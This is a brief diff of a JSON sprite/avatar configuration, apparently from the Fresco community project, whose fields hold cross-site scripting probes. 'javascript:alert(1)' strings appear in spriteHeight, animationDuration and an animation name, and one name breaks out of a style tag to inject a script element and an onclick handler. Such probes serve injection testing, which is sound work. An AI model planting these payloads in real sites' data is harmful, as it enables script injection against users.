@@ -1,13 +1,13 @@
 {
   "imageSrc": "https://fres-co.github.io/fresco-community/avatars/fresco/blue.png",
   "spriteWidth": 50,
-  "spriteHeight": "\"javascript:alert(1)",
+  "spriteHeight": "javascript:alert(1)//",
   "offsetX": -50,
   "offsetY": 0,
   "idleX": 50,
   "idleY": 0,
   "animationSteps": 4,
-  "animationDuration": ".1s;javascript:alert(1)",
+  "animationDuration": ".1s;javascript:alert(1)//",
   "animations": [
     {
       "name": " x{};\n</style><script>alert(1)</script><style style=\"animation-name:x\" onclick=\"alert(1)\"></style></div></div>/*",
@@ -49,7 +49,7 @@
       ]
     },
     {
-      "name": "javascript:alert(1)",
+      "name": "javascript:alert(1)//",
       "orientationRange": [180, 360],
       "keyframes": [
         {
